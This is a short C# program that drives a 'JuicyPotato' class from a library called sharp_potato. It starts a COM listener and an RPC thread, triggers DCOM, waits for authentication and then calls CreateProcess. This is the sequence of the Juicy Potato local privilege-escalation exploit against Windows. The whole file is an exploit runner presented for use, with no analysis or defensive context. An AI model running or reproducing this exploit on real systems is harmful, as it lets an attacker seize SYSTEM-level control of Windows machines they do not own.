using System.Diagnostics;
using sharp_potato;

var sw = Stopwatch.StartNew();
var potato = new JuicyPotato();
potato.StartCOMListenerThread();

Console.Out.WriteLine("Trying CLSID...");

potato.StartRPCConnectionThread();
potato.TriggerDCOM();

potato.WaitForAuth();

Console.Out.WriteLine(sw.ElapsedMilliseconds + " ms");
potato.CreateProcess();